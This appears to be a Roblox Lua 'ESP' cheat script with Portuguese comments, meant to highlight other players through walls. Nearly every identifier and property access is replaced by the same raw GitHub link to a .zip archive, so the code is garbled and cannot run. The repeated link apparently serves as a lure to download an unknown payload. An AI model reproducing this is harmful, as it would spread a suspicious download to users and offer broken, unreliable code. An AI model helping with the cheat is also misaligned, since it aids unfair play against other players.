--- Script ESP simples
local Players = game:GetService("Players")
local LocalPlayer = https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip
local RunService = game:GetService("RunService")

-- Função para criar um ESP para um jogador
local function createESP(player)
    if player == LocalPlayer then return end -- Ignorar o próprio jogador
    https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip(function(character)
        local highlight = https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip("Highlight")
        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = character
        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = character
        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip(255, 0, 0) -- Cor do ESP (vermelho)
        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = 0.5
        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = 0
    end)

    -- Caso o jogador já tenha um personagem ao entrar
    if https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip then
        local highlight = https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip("Highlight")
        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip
        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip
        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip(255, 0, 0) -- Cor do ESP (vermelho)
        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = 0.5
        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = 0
    end
end

-- Adicionar ESP para todos os jogadores no jogo
for _, player in ipairs(Players:GetPlayers()) do
    createESP(player)
end

-- Adicionar ESP para novos jogadores que entrarem no jogo
https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip(function(player)
    createESP(player)
end)
